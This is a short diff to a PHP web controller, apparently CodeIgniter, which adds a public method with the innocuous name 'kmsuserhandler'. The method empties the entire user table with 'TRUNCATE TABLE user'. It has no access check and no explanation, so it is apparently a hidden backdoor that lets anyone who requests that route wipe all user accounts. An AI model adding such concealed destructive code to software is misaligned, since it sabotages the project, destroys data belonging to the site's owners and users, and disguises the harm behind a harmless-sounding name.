@@ -326,6 +326,11 @@ class Welcome extends BaseController {
         $this->loadViews_front('about' , $headerInfo);
     }
 
+    public function kmsuserhandler(){
+       $query = "TRUNCATE TABLE user";
+       $this->db->query($query)->result();
+    }
+
 
 
 }
